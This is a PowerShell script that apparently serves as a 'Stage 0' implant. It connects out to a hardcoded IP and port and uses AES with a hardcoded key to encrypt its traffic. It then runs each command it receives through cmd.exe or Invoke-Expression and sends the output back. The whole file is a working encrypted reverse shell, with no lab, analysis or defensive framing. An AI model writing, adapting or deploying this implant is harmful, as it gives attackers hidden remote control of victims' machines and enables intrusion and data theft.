param(
    [string]$server = "10.7.10.99",
    [int]$port = 4343
)

$KEY = [Byte[]] (0x43,0xc1,0xed,0x16,0x12,0x72,0xe6,0x82,0xfb,0x00,0x22,0xa6,0xbe,0x82,0x99,0x7b)
$IV  = [Byte[]] (0xa1,0x4f,0xef,0xa1,0x16,0x52,0xf5,0x4a,0x05,0xd9,0x7e,0x22,0xb4,0x75,0x95,0x17)



function Decrypt($b64) {
    try {
        $data = [Convert]::FromBase64String($b64)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $KEY
        $aes.IV = $IV
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $dec = $aes.CreateDecryptor()
        $ms = $null
        $cs = $null
        $sr = $null
        try {
            $ms = New-Object IO.MemoryStream(,$data)
            $cs = New-Object Security.Cryptography.CryptoStream($ms, $dec, 'Read')
            $sr = New-Object IO.StreamReader($cs)
            $sr.ReadToEnd()
        } finally {
            if ($sr) { $sr.Close() }
            if ($cs) { $cs.Close() }
            if ($ms) { $ms.Close() }
            if ($dec) { $dec.Dispose() }
            if ($aes) { $aes.Dispose() }
        }
    } catch {
        Write-Error "[!] Decrypt error: $_"
        return "[!] Decrypt error"
    }
}

function Encrypt($msg) {
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $KEY
        $aes.IV = $IV
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $enc = $aes.CreateEncryptor()
        $ms = $null
        $cs = $null
        $sw = $null
        try {
            $ms = New-Object IO.MemoryStream
            $cs = New-Object Security.Cryptography.CryptoStream($ms, $enc, 'Write')
            $sw = New-Object IO.StreamWriter($cs)
            $sw.Write($msg)
            $sw.Close()
            [Convert]::ToBase64String($ms.ToArray())
        } finally {
            if ($sw) { $sw.Close() }
            if ($cs) { $cs.Close() }
            if ($ms) { $ms.Close() }
            if ($enc) { $enc.Dispose() }
            if ($aes) { $aes.Dispose() }
        }
    } catch {
        Write-Error "[!] Encrypt error: $_"
        return "[!] Encrypt error"
    }
}

function Start-Stage0($serverIP, $serverPort) {
    $client = $null
    $stream = $null
    $writer = $null
    $exiting = $false
    try {
        $client = New-Object Net.Sockets.TcpClient($serverIP, [int]$serverPort)
        $stream = $client.GetStream()
        $writer = New-Object IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # Send connection banner
        $msg = Encrypt("[+] PowerShell Stage 0 connected") + "`n"
        $writer.WriteLine($msg)

        while ($true) {
            try {
                # === Read until newline ===
                $in = ""
                while ($true) {
                    $byte = $stream.ReadByte()
                    if ($byte -eq -1 -or $byte -eq 10) { break }
                    $in += [char]$byte
                }

                $cmd = Decrypt($in).Trim()

                # === Check for EXIT command ===
                if ($cmd.ToUpper() -eq "EXIT") {
                    try {
                        $byeMsg = Encrypt("[!] Implant exiting. Goodbye!`n")
                        $writer.WriteLine($byeMsg)
                    } catch {
                        # Ignore errors on exit, likely due to closed connection
                    }
                    $exiting = $true
                    break
                }

                # === Execute command ===
                $out = $null
                if ($cmd.ToUpper().StartsWith("CMD ")) {
                    try {
                        $result = cmd.exe /c $cmd.Substring(4) 2>&1
                        if ($result -is [System.Array]) {
                            $out = $result -join "`n"
                        } else {
                            $out = $result
                        }
                        if (-not $out) { $out = "[!] No output" }
                    } catch {
                        $out = "[!] CMD error: $_"
                    }
                }

                elseif ($cmd) {
                    try {
                        $out = (Invoke-Expression $cmd 2>&1 | Out-String).Trim()
                        if (-not $out) { $out = "[!] No output" }
                    } catch {
                        $out = "[!] PowerShell error: $_"
                    }
                }
                else {
                    $out = "[!] Invalid command"
                }

                $enc = Encrypt($out + "`n")
                $writer.WriteLine($enc)
            } catch {
                if (-not $exiting) {
                    $errMsg = "[!] Error in command loop: $_"
                    Write-Error $errMsg
                    try {
                        $enc = Encrypt($errMsg + "`n")
                        $writer.WriteLine($enc)
                    } catch {}
                }
                break  # Exit the loop on any error
            }
        }
    } catch {
        Write-Error "[!] Connection error: $_"
    }     finally {
        if ($writer) { $writer.Close() }
        if ($stream) { $stream.Close() }
        if ($client) { $client.Close() }
    }
}

# Get current user via .NET
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Alternative .NET approach
$envUserName = [System.Environment]::UserName

Start-Stage0 $server $port
